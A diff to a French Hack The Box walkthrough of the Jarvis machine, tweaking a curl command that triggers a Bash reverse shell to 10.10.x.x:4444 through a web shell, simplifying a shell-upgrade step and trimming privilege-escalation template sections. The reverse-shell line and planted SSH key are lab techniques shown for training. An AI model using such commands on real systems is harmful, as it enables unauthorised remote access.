@@ -1411,7 +1411,7 @@ Depuis un second terminal, tu déclenches un reverse shell Bash en remplaçant `
 
 ```bash
 curl -G \
-  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1'" \
+  --data-urlencode "command=bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1'" \
   http://jarvis.htb/shell.php
 ```
 
@@ -1449,8 +1449,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 Tu suspends ensuite le shell avec `Ctrl+Z`, puis, depuis Kali :
 
 ```bash
-stty raw -echo
-fg
+stty raw -echo; fg
 ```
 
 Après avoir appuyé sur `Entrée`, tu réinitialises le terminal :
@@ -1891,20 +1890,6 @@ $(/tmp/install_pepper_key.sh)
 
 Le script est alors exécuté avec les privilèges de `pepper`. Il crée son répertoire `.ssh`, télécharge la clé publique et applique les permissions attendues.
 
-Tu peux vérifier les fichiers créés :
-
-```bash
-ls -ld /home/pepper/.ssh
-ls -l /home/pepper/.ssh/authorized_keys
-```
-
-Les permissions doivent être semblables à :
-
-```text
-drwx------ pepper pepper /home/pepper/.ssh
--rw------- pepper pepper /home/pepper/.ssh/authorized_keys
-```
-
 Depuis Kali, tu sécurises la clé privée :
 
 ```bash
@@ -1954,20 +1939,7 @@ L’accès au compte `pepper` est donc validé. Tu peux désormais passer à l'e
 
 ## Escalade de privilèges
 
-{{< escalade-intro user="ssh_user" >}}
-
-
-### Observation passive avec pspy64
-
-```bash
-./pspy64
-```
-
-Si système 32 bits :
-
-```bash
-./pspy32
-```
+{{< escalade-intro user="pepper" >}}
 
 ### Vérification sudo
 
@@ -2004,103 +1976,6 @@ Alternative :
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-### Services locaux
-
-```bash
-ss -tulnp
-```
-
-Alternative :
-
-```bash
-netstat -tulnp
-```
-
-### Recherche d’un service derrière un port local
-
-Exemple avec le port `8080` :
-
-```bash
-grep -r ':8080' /etc 2>/dev/null
-```
-
-Recherche élargie :
-
-```bash
-grep -r '8080' /etc 2>/dev/null
-```
-
-### Tunnel SSH vers un service local
-
-Exemple avec un service local sur `127.0.0.1:8080` :
-
-```bash
-ssh -L 8080:127.0.0.1:8080 user@target
-```
-
-Accès depuis Kali :
-
-```text
-http://localhost:8080
-```
-
-### Linpeas
-
-```bash
-./linpeas.sh
-```
-
-### Dernier recours : le kernel
-
-```bash
-uname -a
-./les.sh
-```
-
-### Conclusion de l’énumération privilege escalation
-
-À la fin de cette phase, tu peux résumer les pistes testées :
-
-* sudo
-* contexte utilisateur
-* fichiers lisibles
-* capabilities
-* SUID
-* cron et timers
-* services locaux
-* LinPEAS
-* kernel
-
-Dans ce cas précis, la piste exploitable est :
-
-```text
-<résumer ici la piste réellement exploitée>
-```
-
-### Exploitation de la piste identifiée
-
-Tu exploites ensuite la mauvaise configuration identifiée pendant l’énumération.
-
-```bash
-<commandes d’exploitation>
-```
-
-Tu confirmes l’élévation de privilèges :
-
-```bash
-whoami
-id
-hostname
-```
-
-Résultat attendu :
-
-```text
-root
-uid=0(root) gid=0(root) groups=0(root)
-machine
-```
-
 ### root.txt
 
 Une fois root, tu peux lire le flag final :
@@ -2120,9 +1995,6 @@ Cette étape termine l’escalade de privilèges.
 
 ---
 
-## Pièces jointes (optionnel)
 
-- Scripts, one-liners, captures, notes.  
-- Arbo conseillée : `files/<nom_ctf>/…`
 
 {{< feedback >}}
